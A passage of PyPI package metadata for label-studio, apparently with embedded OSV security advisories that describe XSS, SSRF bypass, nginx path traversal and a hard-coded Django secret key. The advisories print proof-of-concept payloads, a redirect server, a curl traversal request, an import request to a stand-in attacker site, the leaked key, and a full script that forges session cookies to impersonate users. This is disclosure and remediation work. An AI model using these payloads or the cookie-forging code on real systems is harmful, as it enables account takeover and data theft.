function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.1/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.20)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c6d2ad245de1e23259d639b68480e53213eb61197dfbd0e9af8e8cad56d41342","md5":"b031830558b1c2eb70172f234f87a783","sha256":"bca143fcd89ef6683c9c533aafc460f75d0f6b1dec425a6c1122f6cba24b0616"},"downloads":-1,"filename":"label_studio-0.8.1-py3-none-any.whl","has_sig":false,"md5_digest":"b031830558b1c2eb70172f234f87a783","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10304344,"upload_time":"2020-11-20T01:57:21","upload_time_iso_8601":"2020-11-20T01:57:21.255110Z","url":"https://files.pythonhosted.org/packages/c6/d2/ad245de1e23259d639b68480e53213eb61197dfbd0e9af8e8cad56d41342/label_studio-0.8.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d42e1be38b99bbd6f385257b368cbee3cbdf8ca89c28037bd2fbdd021ea03060","md5":"767eeb051f4b0d3eee3fe0eae4e6e64f","sha256":"200f9ffaa9e6af837a7aff9a912be6e90ee3ca97c5ab08d77452756eb0d09551"},"downloads":-1,"filename":"label-studio-0.8.1.tar.gz","has_sig":false,"md5_digest":"767eeb051f4b0d3eee3fe0eae4e6e64f","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":10206719,"upload_time":"2020-11-20T01:57:25","upload_time_iso_8601":"2020-11-20T01:57:25.406528Z","url":"https://files.pythonhosted.org/packages/d4/2e/1be38b99bbd6f385257b368cbee3cbdf8ca89c28037bd2fbdd021ea03060/label-studio-0.8.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, 